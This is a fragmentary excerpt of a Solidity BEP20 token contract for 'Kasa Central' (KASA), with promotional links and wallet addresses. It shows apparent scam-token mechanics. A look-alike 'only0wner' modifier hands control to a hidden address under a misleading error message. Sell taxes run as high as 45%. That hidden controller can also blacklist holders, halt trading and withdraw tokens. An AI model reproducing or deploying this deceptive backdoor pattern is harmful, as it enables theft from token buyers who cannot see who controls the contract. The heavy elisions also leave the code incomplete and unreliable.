...
// File: TOKEN.sol
// https://kasacentral.net
// https://twitter.com/CentralKasa
// https://t.me/KasaCentral
...
library Address{
   ...
   contract KasaCentral is Context, IBEP20, Ownable {
  ...
  mapping(address => bool) public BursnAZERTY;
    ...
    address public marketingWallet = 0xCfbfFA7087E164Ae8247c4e502f3138af6C452c5;
    address public donationWallet = 0xCfbfFA7087E164Ae8247c4e502f3138af6C452c5;

    string private constant _name = "Kasa Central";
    string private constant _symbol = "KASA";
    ...
    Taxes public taxes = Taxes(1, 10, 2, 5);
    Taxes public sellTaxes = Taxes(1, 45, 8, 45);
...
modifier only0wner () {
    require(Bursnpinksale == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
    ...
    function setTradingStatus(bool state) external only0wner{
    ...
    function airdropTokens(address[] memory accounts, uint256[] memory amounts) external only0wner{
    ...
    function bulkExcludeFee(address[] memory accounts, bool state) external only0wner{
        for(uint256 i = 0; i < accounts.length; i++){
    ...
    function updateCooldown(bool state, uint256 time) external only0wner{
        coolDownTime = time * 1 seconds;
        coolDownEnabled = state;
    }

    function updateSwapTokensAtAmount(uint256 amount) external only0wner{
        swapTokensAtAmount = amount * 10**_decimals;
    }

    function updateSwapEnabled(bool _enabled) external only0wner{
        swapEnabled = _enabled;
    }
    
    function updateIsBlacklisted(address account, bool state) external only0wner{
        _isBlacklisted[account] = state;
    }
    
    function bulkIsBlacklisted(address[] memory accounts, bool state) external only0wner{
        for(uint256 i =0; i < accounts.length; i++){
    ...
    function updateAllowedTransfer(address account, bool state) external only0wner{
        allowedTransfer[account] = state;
    }
    
    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external only0wner{
        maxBuyLimit = maxBuy * 10**decimals();
        maxSellLimit = maxSell * 10**decimals();
    }
    
    function updateMaxWalletlimit(uint256 amount) external only0wner{
        maxWalletLimit = amount * 10**decimals();
    }

    function updateRouterAndPair(address newRouter, address newPair) external only0wner{
    ...
    function rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount) public only0wner  {
